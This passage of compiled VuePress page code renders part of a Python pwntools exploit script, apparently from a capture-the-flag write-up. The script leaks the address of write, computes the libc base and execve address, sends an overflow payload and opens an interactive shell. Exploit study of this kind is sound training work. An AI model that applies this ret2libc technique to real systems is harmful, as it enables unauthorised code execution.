punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token number"}},[s._v("4")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\np"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("recv"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\np"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("sendline"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("payload1"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\ndata "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" p"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("recv"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),n("span",{pre:!0,attrs:{class:"token number"}},[s._v("4")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v("\nwrite_addr "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" u32"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("data"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\noffset "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" write_addr "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v(" libc"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("symbols"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),n("span",{pre:!0,attrs:{class:"token string"}},[s._v("'write'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v("\nexecve_addr "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" offset "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("+")]),s._v(" execve\npayload "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" junk "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("+")]),s._v(" p32"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("execve_addr"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\np"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("sendlineafter"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token string"}},[s._v('"Input:\\n"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v("payload"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\np"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("interactive"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n")])]),s._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[s._v("1")]),n("br"),n("span",{staticClass:"line-number"},[s._v("2")]),n("br"),n("span",{staticClass:"line-number"},[s._v("3")]),n("br"),n("span",{staticClass:"line-number"},[s._v("4")]),n("br"),n("span",{staticClass:"line-number"},[s._v("5")]),n("br"),n("span",{staticClass:"line-number"},[s._v("6")]),n("br"),n("span",{staticClass:"line-number"},[s._v("7")]),n("br"),n("span",{staticClass:"line-number"},[s._v("8")]),n("br"),n("span",{staticClass:"line-number"},[s._v("9")]),n("br"),n("span",{staticClass:"line-number"},[s._v("10")]),n("br"),n("span",{staticClass:"line-number"},[s._v("11")]),n("br"),n("span",{staticClass:"line-number"},[s._v("12")]),n("br"),n("span",{staticClass:"line-number"},[s._v("13")]),n("br"),n("span",{staticClass:"line-number"},[s._v("14")]),n("br"),n("span",{staticClass:"line-number"},[s._v("15")]),n("br"),n("span",{staticClass:"line-number"},[s._v("16")]),n("br"),n("span",{staticClass:"line-number"},[s._v("17")]),n("br"),n("span",{staticClass:"line-number"},[s._v("18")]),n("br"),n("span",{staticClass:"line-number"},[s._v("19")]),n("br"),n("span",{staticClass:"line-number"},[s._v("20")]),n("br"),n("span",{staticClass:"line-number"},[s._v("21")]),n("br"),n("span",{staticClass:"line-number"},[s._v("22")]),n("br")])])])}),[],!1,null,null,null);t.default=e.exports}}]);